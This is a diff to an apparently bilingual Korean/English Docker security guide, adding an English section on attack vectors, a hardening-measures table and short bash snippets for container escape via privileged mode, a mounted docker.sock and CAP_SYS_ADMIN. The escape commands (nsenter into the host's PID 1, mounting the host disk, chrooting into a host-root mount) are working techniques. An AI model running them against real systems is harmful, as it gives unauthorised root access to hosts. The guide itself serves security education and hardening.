@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Docker 보안: 컨테이너 탈출 및 취약점 분석
 
 ## 1. Docker 보안 개요
@@ -989,3 +995,54 @@ docker run --rm \
 | Seccomp 프로파일 | MEDIUM | 기본 프로파일 또는 커스텀 |
 | 이미지 서명 검증 | MEDIUM | DOCKER_CONTENT_TRUST=1 |
 | 정기 이미지 스캔 | MEDIUM | CI/CD 파이프라인 통합 |
+
+---
+
+<a name="english"></a>
+
+# Docker Security: Container Escape and Vulnerability Analysis
+
+## 1. Docker Security Overview
+
+Docker containers share the host kernel but are isolated by namespaces and cgroups. Key attack vectors include:
+
+- **Privileged container escape**: Full host access when `--privileged` flag is used
+- **Docker socket exposure**: `/var/run/docker.sock` mount gives root-equivalent access
+- **Volume mount abuse**: Mounting sensitive host paths
+- **Image vulnerabilities**: Outdated base images with known CVEs
+
+## Key Security Hardening Measures
+
+| Measure | Priority | Implementation |
+|---------|----------|---------------|
+| Run as non-root user | HIGH | Specify USER in Dockerfile |
+| Read-only root FS | HIGH | `--read-only` flag |
+| Seccomp profile | MEDIUM | Default profile or custom |
+| Image signature verification | MEDIUM | DOCKER_CONTENT_TRUST=1 |
+| Periodic image scanning | MEDIUM | CI/CD pipeline integration |
+
+## Container Escape Techniques
+
+### Privileged Container Escape
+```bash
+# Mount host filesystem from privileged container
+nsenter -t 1 -m -u -i -n -p -- bash
+
+# Or via device access
+fdisk -l
+mount /dev/sda1 /mnt/host
+```
+
+### Docker Socket Escape
+```bash
+# If /var/run/docker.sock is mounted inside container
+docker run -v /:/hostroot --rm -it ubuntu bash
+chroot /hostroot
+```
+
+### Capability Abuse
+```bash
+# CAP_SYS_ADMIN allows mount operations
+mount -t tmpfs tmpfs /tmp
+nsenter -t 1 -m -u -i -n -p -- bash
+```
